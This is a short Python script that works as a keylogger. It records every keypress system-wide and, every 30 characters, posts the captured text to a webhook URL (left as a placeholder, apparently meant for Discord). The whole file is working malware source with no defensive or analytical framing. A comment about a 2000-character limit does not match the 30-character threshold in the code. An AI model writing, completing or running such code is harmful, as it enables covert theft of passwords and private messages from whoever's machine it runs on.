import keyboard
import requests

whurl = "urlhere"

#function to send to webhook, post request
def send(data):
    requests.post(whurl, json={"content":data})

#function for the keylogger
def keylog():
    user_input=[] #empty list
    def on_keypress(event):
        if event.name == "space":
            user_input.append(" ")#if space is recorded append an empty space
        elif event.name == "enter":
            user_input.append("\n")#if enter is recorded input a newline
        elif len(event.name) == 1:
            user_input.append(event.name)#records everything else
        if len("".join(user_input)) >= 30: #will only send 2000 chars (max supported by discord as far as i know)
            send("".join(user_input))#calls send function
            user_input.clear()#clears the list
    keyboard.on_press(on_keypress)
    keyboard.wait()
if __name__ == "__main__":
    keylog()
